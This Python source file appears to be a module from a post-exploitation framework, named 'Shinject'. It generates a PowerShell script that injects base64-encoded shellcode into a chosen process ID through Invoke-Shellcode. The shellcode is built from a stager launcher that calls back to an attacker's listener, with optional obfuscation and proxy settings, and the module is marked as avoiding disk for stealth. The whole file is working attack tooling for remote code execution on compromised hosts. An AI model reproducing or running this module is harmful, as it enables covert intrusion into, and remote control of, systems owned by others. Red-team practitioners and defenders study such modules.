from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Shinject',

            # List of one or more authors for the module
            'Author': ['@xorrior','@mattefistation','@monogas'],

            # More verbose multi-line description of the module
            'Description': ('Injects a PIC shellcode payload into a target process, via Invoke-Shellcode'),

            # True if the module needs to run in the background
            'Background': True,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'comment',
                ''
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to run the module on.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'ProcId' : {
                'Description'   :   'ProcessID to inject into.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Arch' : {
                'Description'   :   'Architecture of the target process.',
                'Required'      :   True,
                'Value'         :  ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']
        procID = self.options['ProcId']['Value'].strip()
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        arch = self.options['Arch']['Value']

        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()
        
        # If you'd just like to import a subset of the functions from the
        #   module source, use the following:
        #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
        script = moduleCode
        scriptEnd = "; shellcode injected into pid {}".format(str(procID))
        
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: {}".format(listenerName)))
            return ''
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            
            if launcher == '':
                print(helpers.color('[!] Error in launcher generation.'))
                return ''
            else:
                launcherCode = launcher.split(' ')[-1]

                sc = self.mainMenu.stagers.generate_shellcode(launcherCode, arch)

                encoded_sc = helpers.encode_base64(sc)

        # Add any arguments to the end execution of the script
        
        #t = iter(sc)
        #pow_array = ',0x'.join(a+b for a,b in zip(t, t))
        #pow_array = "@(0x" + pow_array + " )"
        script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(procID, encoded_sc)
        script += scriptEnd
        return script
